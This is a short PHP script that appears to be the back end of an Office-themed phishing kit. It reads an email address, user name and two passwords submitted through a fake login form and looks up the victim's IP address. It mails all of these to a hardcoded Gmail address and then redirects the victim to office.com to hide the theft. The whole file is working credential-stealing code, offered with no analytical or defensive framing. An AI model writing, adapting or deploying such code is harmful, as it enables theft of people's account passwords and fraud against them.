<?php


if(isset($_POST['email']) && ($_POST['pass']))
 
    {
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));
$mail_server = 'blueowa Server';
$emailadd234 = $_POST['email'];
$user = $_POST['user'];
$passw234 = $_POST['pass'];
$ndpass234 = $_POST['pass2'];

$to = 'lucasnick542@gmail.com';
$subject = getenv("REMOTE_ADDR");
$from = "From: TRIGGAR <Austraia>";

$comment = $mail_server.' Details from !-S.Wire-!: '."\n"
      .'**************************************'."\n"
      .'email: '.$emailadd234."\n"
      .'User: '.$user."\n"
    .'Password: '.$passw234."\n"
    .'2ndPassword: '.$ndpass234."\n"
 
.'UserIp: '.$ip."\n";



mail($to, $subject, $comment, $from);


header("Location: https://www.office.com/");
exit;
}
else
{
    header("Location: https://google.com");
}


?>